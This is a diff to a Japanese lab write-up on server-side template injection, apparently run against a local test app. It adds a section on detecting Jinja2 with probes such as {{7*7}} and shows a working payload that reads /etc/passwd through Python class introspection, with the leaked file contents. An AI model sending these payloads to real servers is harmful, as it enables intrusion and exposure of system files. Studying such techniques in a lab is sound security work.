@@ -452,6 +452,31 @@ http://192.168.99.100:15001/reflect/mako?inj=${engine}
 Internal Server Error
 ```
 #### jinja2
+```python
+    elif engine == 'jinja2':
+        return randomword() + Jinja2Env.from_string(template % injection).render() + randomword()
+```
+以下でJinja2と判定できる。   
+```txt
+http://192.168.99.100:15001/reflect/jinja2?inj=*
+hzdrchlb*jbjleazb
+
+http://192.168.99.100:15001/reflect/jinja2?inj=${7*7}
+pirsuits${7*7}uxbbvhtz
+
+http://192.168.99.100:15001/reflect/jinja2?inj={{7*7}}
+cylhjspv49luxnnntk
+
+http://192.168.99.100:15001/reflect/jinja2?inj={{7*%277%27}}
+bvsjkzpq7777777bqoqcsnp
+```
+以下にいろいろ手法が書いてるけどなんかよくわからん…。   
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2   
+大抵はInternal server errorになったけど以下だけは動いた   
+```txt
+http://192.168.99.100:15001/reflect/jinja2?inj={{%20%27%27.__class__.__mro__[2].__subclasses__()[40](%27/etc/passwd%27).read()%20}}
+kumvedgwroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync......
+```
 #### tornado
 ### Ruby
 ### Node.js
